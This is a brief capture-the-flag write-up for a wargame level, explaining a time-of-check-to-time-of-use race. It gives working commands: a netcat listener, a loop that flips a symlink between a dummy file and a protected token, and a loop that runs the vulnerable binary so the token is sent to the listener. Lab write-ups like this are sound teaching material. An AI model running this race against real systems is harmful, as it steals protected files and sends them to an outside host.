# Level 10

TOCTOU race.

Program checks access first, then uses the file later. If you swap target between those moments, you can win.

This level is very timing-sensitive, so a tiny command difference can make it fail.

I use 3 terminals.

## 1: Find the correct target IP

On the machine where your listener runs:

```bash
hostname -I
```

probably: 10.0.2.15

## 2: Terminal A -> listener on port 6969

Depending on your `nc` version, use one of these:

```bash
nc -lk 6969
```

## 3: Terminal B -> race loop (more stable)

Create a readable file once:

```bash
echo 'ok' > /tmp/ok
```

Then flip `/tmp/file` between readable file and token link:

```bash
while true; do
  ln -sf /tmp/ok /tmp/file
  ln -sf /home/user/level10/token /tmp/file
  rm -f /tmp/file
done
```

## 4: Terminal C -> trigger loop

```bash
while true; do
  ./level10 /tmp/file 10.0.2.15
done
```

When timing hits, token lands in the listener terminal.